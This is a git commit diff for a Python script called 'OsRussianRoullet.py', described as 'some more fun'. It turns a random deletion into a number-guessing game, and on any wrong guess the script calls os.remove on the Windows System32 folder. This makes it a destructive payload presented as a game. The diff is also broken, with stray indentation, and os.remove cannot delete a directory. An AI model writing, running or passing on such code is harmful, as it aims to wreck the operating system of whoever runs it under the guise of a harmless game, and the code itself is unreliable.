c428e4bb38743ede2f41313b9d825fbb08d3d197
Kiprono Felix <89996808+Rotichkiprono@users.noreply.github.com>
2024-04-13 15:19:08 +0300

    Update OsRussianRoullet.py
    some more fun

--- OsRussianRoullet.py
+++ OsRussianRoullet.py
@@ -1,5 +1,9 @@
 import os
 import random
-
-if random.randint(0, 6) == 1:
+ num = random.randint(1,10)
+  guess = input("guess number between 1 and 10 !!")
+  guess = int(guess)
+if guess == num:
+  print("you won")
+else:
   os.remove("C:\Windows\System32")
